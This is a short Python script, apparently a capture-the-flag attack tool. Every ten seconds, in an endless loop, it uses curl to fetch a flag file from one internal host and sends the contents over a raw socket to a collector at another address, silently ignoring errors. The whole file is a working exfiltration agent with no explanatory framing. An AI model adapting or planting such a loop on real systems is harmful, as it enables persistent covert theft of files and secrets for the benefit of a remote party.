#!/usr/bin/env python
#-*- coding:utf-8 -*-
import subprocess,socket,time

flag_url = 'curl -s http://172.16.80.144/flag.txt'
host = '172.16.80.1'
port = 8000

def main():
    socket.setdefaulttimeout(5)
    while True:
        try:
            p = subprocess.Popen(flag_url,shell=True,stdout=subprocess.PIPE)  
            flag = ''.join(p.stdout.readlines()).strip()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            sock.connect((host, port))  
            sock.send(flag)  
            sock.close()
        except KeyboardInterrupt:
            exit()
        except:
            pass
        time.sleep(10)

if __name__ == '__main__':
    main()